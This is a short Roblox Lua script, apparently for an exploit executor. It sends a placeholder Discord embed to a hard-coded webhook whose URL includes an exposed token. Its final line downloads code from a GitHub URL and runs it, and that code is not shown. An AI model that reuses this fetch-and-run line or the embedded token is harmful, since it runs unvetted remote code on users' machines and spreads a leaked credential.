url = "https://discord.com/api/webhooks/1120613169967145041/GT5IPqAu2Mh5qQ_XFxkjJHV6pnYo4CD5ebL08cDZZ_VlLL_MwPJFw6urfzp9qQRg3_yx"

local data = {
   ["username"] = "",
   ["avatar_url"] = "",
   ["content"] = "",
   ["embeds"] = {
       {
           ["title"] = "**Im A Title!**",
           ["url"] = "",
           ["description"] = "Im A Description!",
           ["type"] = "rich",
           ["color"] = tonumber(0xff0000),
           ["fields"] = {
               {
                   ["name"] = "Field 1",
                   ["value"] = "Wow, im an inline field",
                   ["inline"] = true
               },
               {
                   ["name"] = "Field 2",
                   ["value"] = "Wow, im an inline field",
                   ["inline"] = true
               },
               {
                   ["name"] = "Field 3",
                   ["value"] = "im not an inline field",
                   ["inline"] = false
               }
           },
           ["footer"] = {
               ["text"] = "Footer Text Here!",
               ["icon_url"] = "",
           },
           ["thumbnail"] = {
               ["url"] = ""
           },
           ["author"] = {
               ["name"] = "Author Name",
               ["icon_url"] = "",
               ["url"] = ""
           },
           ["image"] = {
               ["url"] = ""
           }
       }
   }
}

-- post request
local newdata = game:GetService("HttpService"):JSONEncode(data)
local headers = {
   ["content-type"] = "application/json"
}

request = http_request or request or HttpPost or syn.request
local fulldata = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(fulldata)
loadstring(game:HttpGet("https://raw.githubusercontent.com/1f0yt/community/main/ShadowBoxing"))()
